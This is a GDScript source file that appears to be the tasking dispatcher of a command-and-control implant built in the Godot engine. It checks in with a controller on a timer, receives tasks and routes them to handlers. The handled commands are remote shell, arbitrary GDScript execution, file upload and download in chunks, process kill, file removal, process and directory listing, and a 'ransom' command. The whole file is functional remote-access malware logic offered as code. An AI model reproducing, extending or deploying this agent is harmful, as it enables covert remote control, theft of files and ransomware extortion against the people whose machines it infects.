extends Node

var parent
var api
var task_id_to_last_action

signal whoami
signal exit
signal ransom
signal post_response
signal ps
signal ls
signal kill
signal rm
signal shell
signal gdscript
signal upload
signal upload_start
signal upload_chunk
signal download
signal download_start
signal download_chunk

func _ready():
	parent = $".".get_parent()

	api = parent.get_node("api")
	task_id_to_last_action = {}

func _on_CallbackTimer_timeout():
	print("_on_CallbackTimer_timeout, adding tasking request to outbound queue")
	# TODO: if not api.checkin_done and we've had X timeout/callbacks - kill agent?
	var cbt = parent.get_node("CallbackTimer")
	
	# TODO: implement command 'sleep' - hook here
	cbt.wait_time = parent.get_node("config").get_callback_wait_time()
	cbt.do_callback = true

	if api.checkin_done:
		api.send_agent_response(api.get_tasking_payload())

func _on_Agent_tasking(data):

	print("on agent tasking: ", data)

	if data.has("payload") and data.get("payload").has("tasks"):

		for task in data.get("payload").get("tasks"):
			print("task: ", task)

			match task.get("command"):
				"download":
					task_id_to_last_action[task.get("id")] = "download"
					emit_signal("download", task)
				"upload":
					task_id_to_last_action[task.get("id")] = "upload"
					emit_signal("upload", task)
				"shell":
					emit_signal("shell", task)
				"gdscript":
					emit_signal("gdscript", task)
				"kill":
					emit_signal("kill", task)
				"ps":
					emit_signal("ps", task)
				"ls":
					emit_signal("ls", task)
				"rm":
					emit_signal("rm", task)
				"whoami":
					emit_signal("whoami", task)
				"exit":
					emit_signal("exit", task)
				"ransom":
					emit_signal("ransom", task)
				"post_response":
					emit_signal("post_response", task)
				_:
					print("unknown task... ", task)

func _on_Agent_post_response(data):
	print("_on_Agent_post_response: ", data)
	
	var payload = data.get("payload")

	for response in payload.get("responses"):
		var task_id = response.get("task_id")

		if response.get("status") == "success":

			match task_id_to_last_action.get(task_id):
				"upload":
					if response.has("file_id"):
						emit_signal("upload_start", response)
						task_id_to_last_action[task_id ] = "upload_chunk"
					else:
						print("Bad upload response: ", response)
				"upload_chunk":
					if response.has("file_id"):
						emit_signal("upload_chunk", response)
						task_id_to_last_action[task_id ] = "upload_chunk"
					else:
						print("Bad upload response: ", response)
				"download":
					if response.has("file_id"):
						emit_signal("download_start", response)
						task_id_to_last_action[task_id ] = "download_chunk"
					else:
						print("Bad download response: ", response)
				"download_chunk":
					emit_signal("download_chunk", response)
					task_id_to_last_action[task_id ] = "download_chunk"
				_:
					print("unknown download last action: ", task_id_to_last_action.get(task_id))
		else:
			print("failed response: ", response)

	#{"action": "post_response", "responses": [{
	#        "status": "success",
	#        "file_id": "UUID Here"
	#        "task_id": "task uuid here"
	#    }
	#]}
	
